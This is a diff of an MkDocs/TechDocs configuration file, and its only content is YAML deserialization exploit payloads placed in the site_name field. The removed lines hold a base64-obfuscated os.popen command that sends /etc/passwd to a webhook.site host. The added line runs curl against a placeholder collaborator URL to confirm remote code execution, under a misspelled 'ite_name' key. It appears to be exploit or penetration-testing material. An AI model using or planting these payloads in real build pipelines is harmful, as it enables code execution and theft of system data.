@@ -1,6 +1,4 @@
-site_name: !!python/object/apply:os.popen
-  args:
-    - "echo Y3VybCBodHRwczovL3dlYmhvb2suc2l0ZS80ZTEyMTA4NS1jZGExLTRlNzUtOWJkZi04YjE1YjlmNTBjN2UgLWQgIiQoY2F0IC9ldGMvcGFzc3dkKSIK== | base64 -d | bash"
+ite_name: !!python/object/apply:subprocess.check_output ["curl -k http://YOUR_COLLABORATOR_OR_WEBHOOK_URL/RCE_CONFIRMED"]
 plugins:
   - techdocs-core
 
